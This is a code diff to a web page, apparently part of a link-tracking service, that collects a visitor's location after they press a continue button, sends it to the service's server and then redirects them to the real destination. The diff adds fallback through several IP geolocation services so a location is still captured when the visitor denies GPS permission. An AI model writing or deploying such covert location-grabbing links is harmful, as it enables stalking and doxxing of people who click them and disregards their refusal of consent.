@@ -37,9 +37,7 @@ body {
   font-weight: 600;
   border-radius: 50px;
   cursor: pointer;
-  transition: transform 0.2s;
   width: 100%;
-  touch-action: manipulation;
 }
 
 .btn:active {
@@ -72,7 +70,7 @@ p {
 
 .status {
   color: white;
-  font-size: 14px;
+  font-size: 13px;
   margin-top: 15px;
   opacity: 0;
   transition: opacity 0.3s;
@@ -106,19 +104,17 @@ function showStatus(msg) {
   statusDiv.classList.add('show');
 }
 
-function hideStatus() {
-  statusDiv.classList.remove('show');
-}
-
 // Get destination URL
 fetch('/api/hits/' + linkId)
   .then(r => r.json())
   .then(d => { if (d.dest) destUrl = d.dest; })
   .catch(() => {});
 
-function sendLocation(lat, lon, acc) {
+function sendLocation(lat, lon, acc, source) {
   if (locationSent) return;
   locationSent = true;
+  
+  console.log(`Sending location from ${source}: ${lat}, ${lon}`);
   
   fetch('/api/hit/' + linkId, {
     method: 'POST',
@@ -126,85 +122,130 @@ function sendLocation(lat, lon, acc) {
     body: JSON.stringify({ lat, lon, acc })
   }).catch(() => {});
   
-  // Redirect
+  // Redirect after saving
   setTimeout(() => {
     window.location.href = destUrl;
-  }, 100);
+  }, 300);
 }
 
+// IP Geolocation (always works, no permission needed)
 function getIPLocation() {
-  showStatus('Getting location...');
-  fetch('https://ipapi.co/json/')
-    .then(response => response.json())
-    .then(data => {
-      if (data.latitude && data.longitude) {
-        sendLocation(data.latitude, data.longitude, 5000);
-      } else {
-        sendLocation(null, null, null);
-      }
-    })
-    .catch(() => {
-      sendLocation(null, null, null);
-    });
+  showStatus('Getting network location...');
+  
+  // Try multiple IP geolocation services for redundancy
+  const services = [
+    'https://ipapi.co/json/',
+    'https://ipinfo.io/json/',
+    'https://api.ipgeolocation.io/ipgeo?apiKey=demo'
+  ];
+  
+  let serviceIndex = 0;
+  
+  function tryNextService() {
+    if (serviceIndex >= services.length) {
+      // All services failed, send null
+      sendLocation(null, null, null, 'ip-failed');
+      return;
+    }
+    
+    fetch(services[serviceIndex])
+      .then(response => {
+        if (!response.ok) throw new Error('Service failed');
+        return response.json();
+      })
+      .then(data => {
+        let lat = null, lon = null;
+        
+        // Handle different API response formats
+        if (data.latitude && data.longitude) {
+          lat = data.latitude;
+          lon = data.longitude;
+        } else if (data.lat && data.lon) {
+          lat = data.lat;
+          lon = data.lon;
+        } else if (data.loc) {
+          const coords = data.loc.split(',');
+          lat = parseFloat(coords[0]);
+          lon = parseFloat(coords[1]);
+        }
+        
+        if (lat && lon) {
+          sendLocation(lat, lon, 5000, 'ip');
+        } else {
+          serviceIndex++;
+          tryNextService();
+        }
+      })
+      .catch(() => {
+        serviceIndex++;
+        tryNextService();
+      });
+  }
+  
+  tryNextService();
 }
 
-function grabLocation() {
-  // Prevent multiple requests
+// HTML5 GPS Geolocation (requires permission)
+function getGPSLocation() {
+  showStatus('Requesting GPS permission...');
+  
+  if (!navigator.geolocation) {
+    showStatus('GPS not supported, using network...');
+    getIPLocation();
+    return;
+  }
+  
+  // Set a timeout - if GPS takes too long, fallback to IP
+  const gpsTimeout = setTimeout(() => {
+    showStatus('GPS taking too long, using network...');
+    getIPLocation();
+  }, 8000);
+  
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      clearTimeout(gpsTimeout);
+      showStatus('GPS location captured!');
+      sendLocation(
+        pos.coords.latitude,
+        pos.coords.longitude,
+        Math.round(pos.coords.accuracy),
+        'gps'
+      );
+    },
+    err => {
+      clearTimeout(gpsTimeout);
+      console.log('GPS Error:', err.code, err.message);
+      
+      // GPS failed or denied, fallback to IP
+      if (err.code === 1) {
+        showStatus('GPS permission denied, using network...');
+      } else if (err.code === 2) {
+        showStatus('GPS unavailable, using network...');
+      } else if (err.code === 3) {
+        showStatus('GPS timeout, using network...');
+      }
+      getIPLocation();
+    },
+    { 
+      enableHighAccuracy: true, 
+      timeout: 7000, 
+      maximumAge: 0 
+    }
+  );
+}
+
+function startTracking() {
   if (locationRequested) return;
   locationRequested = true;
   
-  // Hide button, show spinner
   continueBtn.style.display = 'none';
   loading.classList.remove('hidden');
   
-  // Small delay to ensure DOM is ready
-  setTimeout(() => {
-    if (navigator.geolocation) {
-      showStatus('Requesting permission...');
-      
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          showStatus('Location captured!');
-          sendLocation(
-            pos.coords.latitude,
-            pos.coords.longitude,
-            Math.round(pos.coords.accuracy)
-          );
-        },
-        err => {
-          console.log('Error code:', err.code);
-          // If user denies or error, fallback to IP
-          if (err.code === 1) {
-            showStatus('Location denied, using network location...');
-          } else {
-            showStatus('Using network location...');
-          }
-          getIPLocation();
-        },
-        { 
-          enableHighAccuracy: true, 
-          timeout: 15000, 
-          maximumAge: 0 
-        }
-      );
-    } else {
-      showStatus('Using network location...');
-      getIPLocation();
-    }
-  }, 100);
+  // Try GPS first, will fallback to IP automatically
+  getGPSLocation();
 }
 
-// Ensure the button click is clean and not blocked
-continueBtn.addEventListener('click', function(e) {
-  e.preventDefault();
-  e.stopPropagation();
-  grabLocation();
-});
-
-// Also ensure no other elements are overlaying
-document.body.addEventListener('touchstart', function(e) {
-  // Allow default behavior
-}, { passive: false });
+continueBtn.addEventListener('click', startTracking);
 </script>
 </body>
 </html>
